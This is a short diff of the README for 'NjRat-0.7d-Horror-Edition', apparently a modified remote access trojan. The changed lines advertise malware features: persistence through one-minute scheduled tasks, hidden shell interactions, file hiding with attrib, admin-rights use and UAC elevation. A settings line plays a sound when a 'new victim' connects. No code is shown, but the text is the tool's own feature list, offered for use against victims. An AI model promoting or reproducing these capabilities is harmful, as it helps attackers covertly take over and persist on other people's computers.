@@ -1,6 +1,6 @@
 # NjRat-0.7d-Horror-Edition
 
-.:: NEWEST FEATURES: Attrib (Hide file), Fix admin check, UAC (elevate to admin) and many bug fixes
+.:: NEWEST FEATURES: ScheduleTasks, bug fixes, hide all shell interactions.
 
 .:: NOTE: Do not use UAC if you are already admin privileges or the payload will not execute
 
@@ -18,6 +18,7 @@ connect through vpn rasdial
 SETTINGS: Enable/Disable Notify Sounds (Laugh, Bass hit, Door bell, Door opening, Water drip, Church bell,  Ghost, Inform, Notify, Sword, Voice(new victim connected))
 
 BUILDER:
+Schedule Tasks (1Min) +
 Hide file (Attrib) +
 Use Admin Rights +
 Copy to direcroy + 
